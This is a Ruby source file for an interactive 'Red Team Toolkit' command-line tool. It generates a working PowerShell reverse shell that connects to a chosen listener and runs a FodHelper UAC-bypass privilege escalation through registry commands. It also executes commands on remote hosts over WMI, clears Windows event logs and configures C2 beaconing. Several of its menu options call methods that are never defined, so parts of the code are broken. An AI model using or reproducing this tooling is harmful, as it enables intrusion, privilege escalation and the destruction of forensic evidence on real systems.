#!/usr/bin/env ruby# frozen_string_literal: truerequire 'socket'require 'openssl'require 'base64'require 'json'require 'fileutils'require 'win32ole'require 'securerandom'require 'net/http'require 'colorize'require 'tty-prompt'require 'optparse'class RedTeamToolkit  def initialize    @config = {      c2_server: 'c2.example.com:443',      encryption_key: 'aes256:secure_key_placeholder',      sleep_time: 300,      jitter: 0.3,      kill_date: '2024-12-31',      stealth_mode: true    }        @prompt = TTY::Prompt.new    @banner = <<~BANNER.colorize(:red)       ¦¦¦¦¦¦+¦¦¦¦¦¦¦+¦¦¦¦¦¦+ ¦¦¦¦¦¦¦¦+¦¦¦¦¦¦+ ¦¦¦¦¦¦¦+ ¦¦¦¦¦¦+      ¦¦+----+¦¦+----+¦¦+--¦¦++--¦¦+--+¦¦+--¦¦+¦¦+----+¦¦+----+      ¦¦¦     ¦¦¦¦¦+  ¦¦¦¦¦¦++   ¦¦¦   ¦¦¦¦¦¦++¦¦¦¦¦+  ¦¦¦           ¦¦¦     ¦¦+--+  ¦¦+--¦¦+   ¦¦¦   ¦¦+--¦¦+¦¦+--+  ¦¦¦           +¦¦¦¦¦¦+¦¦¦¦¦¦¦+¦¦¦  ¦¦¦   ¦¦¦   ¦¦¦  ¦¦¦¦¦¦¦¦¦¦++¦¦¦¦¦¦+       +-----++------++-+  +-+   +-+   +-+  +-++------+ +-----+    BANNER        parse_options    show_banner    main_menu  end    def parse_options    OptionParser.new do |opts|      opts.banner = "Usage: redteam.rb [options]"            opts.on("-s", "--stealth", "Enable stealth mode (default)") do        @config[:stealth_mode] = true      end            opts.on("-v", "--verbose", "Disable stealth mode") do        @config[:stealth_mode] = false      end            opts.on("-c", "--config FILE", "Load configuration from file") do |file|        load_config(file)      end    end.parse!  end    def load_config(file)    if File.exist?(file)      @config.merge!(JSON.parse(File.read(file), symbolize_names: true))      log("Configuration loaded from #{file}", :green)    else      log("Config file not found: #{file}", :red)    end  end    def show_banner    puts @banner    puts " Red Team Toolkit - Interactive CLI".colorize(:light_red)    puts "=" * 60    puts " Stealth Mode: #{@config[:stealth_mode] ? 'ON'.colorize(:green) : 'OFF'.colorize(:red)}"    puts "=" * 60  end    def main_menu    loop do      choice = @prompt.select("\nMain Menu:".colorize(:yellow), cycle: true) do |menu|        menu.choice "Payload Generator", 1        menu.choice "Privilege Escalation", 2        menu.choice "Lateral Movement", 3        menu.choice "C2 Configuration", 4        menu.choice "Anti-Forensics", 5        menu.choice "Command Execution", 6        menu.choice "Exit", 7      end      case choice      when 1 then payload_menu      when 2 then priv_escalation_menu      when 3 then lateral_movement_menu      when 4 then c2_config_menu      when 5 then antiforensics_menu      when 6 then command_exec_menu      when 7 then exit_program      end    end  end    def payload_menu    loop do      choice = @prompt.select("\nPayload Generator:".colorize(:yellow), cycle: true) do |menu|        menu.choice "Generate Reverse Shell", 1        menu.choice "Generate Stager", 2        menu.choice "Generate DLL Hijack", 3        menu.choice "Back to Main Menu", 4      end      case choice      when 1 then generate_reverse_shell      when 2 then generate_stager      when 3 then generate_dll_hijack      when 4 then break      end    end  end    def generate_reverse_shell    ip = @prompt.ask("Listener IP:", required: true)    port = @prompt.ask("Listener Port:", default: "443")        payload = <<~PS_SCRIPT      $client = New-Object System.Net.Sockets.TCPClient('#{ip}',#{port});      $stream = $client.GetStream();      [byte[]]$bytes = 0..65535|%{0};      while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);        $sendback = (iex $data 2>&1 | Out-String );        $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);        $stream.Write($sendbyte,0,$sendbyte.Length);        $stream.Flush()      };      $client.Close()    PS_SCRIPT        puts "\nGenerated Payload:".colorize(:green)    puts payload.colorize(:light_white)        if @prompt.yes?("Save payload to file?")      filename = @prompt.ask("Filename:", default: "payload_#{Time.now.to_i}.ps1")      save_to_file(filename, payload)    end  end    def priv_escalation_menu    loop do      technique = @prompt.select("\nPrivilege Escalation:".colorize(:yellow), cycle: true) do |menu|        menu.choice "FodHelper Bypass", 1        menu.choice "ComputerDefaults Bypass", 2        menu.choice "SDCLT Bypass", 3        menu.choice "EventViewer Bypass", 4        menu.choice "Back to Main Menu", 5      end      case technique      when 1 then execute_priv_esc('FodHelper')      when 2 then execute_priv_esc('ComputerDefaults')      when 3 then execute_priv_esc('SDCLT')      when 4 then execute_priv_esc('EventViewer')      when 5 then break      end    end  end    def execute_priv_esc(technique)    log("Executing #{technique} privilege escalation", :yellow)        case technique    when 'FodHelper'      commands = [        'reg add "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command" /v "" /d "cmd.exe" /f',        'reg add "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command" /v "DelegateExecute" /d "" /f',        'cmd /c fodhelper.exe',        'reg delete "HKCU\\Software\\Classes\\ms-settings" /f'      ]            commands.each do |cmd|        result = `#{cmd} 2>&1`        log("Command: #{cmd}", :light_blue)        puts result.colorize(:light_white)      end    end        clean_tracks if @config[:stealth_mode]  end    def lateral_movement_menu    loop do      technique = @prompt.select("\nLateral Movement:".colorize(:yellow), cycle: true) do |menu|        menu.choice "WMI Execution", 1        menu.choice "Scheduled Task", 2        menu.choice "DCOM", 3        menu.choice "Back to Main Menu", 4      end      case technique      when 1 then execute_wmi      when 2 then execute_scheduled_task      when 3 then execute_dcom      when 4 then break      end    end  end    def execute_wmi    host = @prompt.ask("Target Host:", required: true)    command = @prompt.ask("Command to execute:", default: "whoami")        begin      wmi = WIN32OLE.connect("winmgmts://#{host}")      process = wmi.Get("Win32_Process")      result = process.Create(command, nil, nil)      log("Execution result: #{result}", :green)    rescue => e      log("WMI Execution failed: #{e.message}", :red)    end        clean_tracks if @config[:stealth_mode]  end    def c2_config_menu    loop do      choice = @prompt.select("\nC2 Configuration:".colorize(:yellow), cycle: true) do |menu|        menu.choice "View Current Settings", 1        menu.choice "Change C2 Server", 2        menu.choice "Change Encryption Key", 3        menu.choice "Adjust Beacon Settings", 4        menu.choice "Save Configuration", 5        menu.choice "Back to Main Menu", 6      end      case choice      when 1        show_current_config      when 2        @config[:c2_server] = @prompt.ask("New C2 Server [host:port]:", default: @config[:c2_server])      when 3        @config[:encryption_key] = @prompt.ask("New Encryption Key [algorithm:key]:", default: @config[:encryption_key])      when 4        @config[:sleep_time] = @prompt.ask("Beacon Interval (seconds):", default: @config[:sleep_time].to_s).to_i        @config[:jitter] = @prompt.ask("Jitter Percentage (0-100):", default: (@config[:jitter]*100).to_i.to_s).to_f / 100      when 5        save_config      when 6        break      end    end  end    def show_current_config    puts "\nCurrent Configuration:".colorize(:yellow)    puts "C2 Server: #{@config[:c2_server]}".colorize(:light_white)    puts "Encryption: #{@config[:encryption_key]}".colorize(:light_white)    puts "Beacon: #{@config[:sleep_time]}s ±#{(@config[:jitter]*100).to_i}%".colorize(:light_white)    puts "Kill Date: #{@config[:kill_date]}".colorize(:light_white)    puts "Stealth Mode: #{@config[:stealth_mode] ? 'ON'.colorize(:green) : 'OFF'.colorize(:red)}"  end    def antiforensics_menu    loop do      choice = @prompt.select("\nAnti-Forensics:".colorize(:yellow), cycle: true) do |menu|        menu.choice "Clear Event Logs", 1        menu.choice "Clear PowerShell History", 2        menu.choice "Clear Prefetch", 3        menu.choice "Clear Recent Files", 4        menu.choice "Back to Main Menu", 5      end      case choice      when 1 then clear_logs      when 2 then clear_ps_history      when 3 then clear_prefetch      when 4 then clear_recent_files      when 5 then break      end    end  end    def clear_logs    logs = @prompt.multi_select("Select logs to clear:", %w[System Security Application])    logs.each do |log|      result = `wevtutil cl #{log} 2>&1`      if $?.success?        log("Cleared #{log} logs", :green)      else        log("Failed to clear #{log} logs: #{result}", :red)      end    end  end    def command_exec_menu    loop do      choice = @prompt.select("\nCommand Execution:".colorize(:yellow), cycle: true) do |menu|        menu.choice "Execute Local Command", 1        menu.choice "Execute Remote Command", 2        menu.choice "Back to Main Menu", 3      end      case choice      when 1        command = @prompt.ask("Command to execute:", required: true)        result = `#{command} 2>&1`        puts "\nResult:".colorize(:green)        puts result.colorize(:light_white)      when 2        lateral_movement_menu      when 3        break      end    end  end    private    def log(message, color = :white)    timestamp = Time.now.strftime("[%Y-%m-%d %H:%M:%S]")    puts "#{timestamp.colorize(:light_black)} #{message.colorize(color)}"  end    def save_to_file(filename, content)    dir = "output"    Dir.mkdir(dir) unless Dir.exist?(dir)    File.write("#{dir}/#{filename}", content)    log("Saved to #{dir}/#{filename}", :green)  end    def save_config    filename = @prompt.ask("Save config as:", default: "redteam_config_#{Time.now.to_i}.json")    File.write(filename, JSON.pretty_generate(@config))    log("Configuration saved to #{filename}", :green)  end    def clean_tracks    # Clear console history if possible    if ENV['TERM_PROGRAM'] == 'iTerm.app' || ENV['TERM_PROGRAM'] == 'Apple_Terminal'      system('clear')    elsif ENV['SESSIONNAME'] =~ /console/i      system('cls')    end        # Remove recent Ruby script history    if File.exist?('~/.irb-history')      FileUtils.rm_f('~/.irb-history')    end        log("Stealth cleanup completed", :yellow)  end    def exit_program    clean_tracks if @config[:stealth_mode]    log("Exiting Red Team Toolkit", :red)    exit  endend# Start the toolkitRedTeamToolkit.new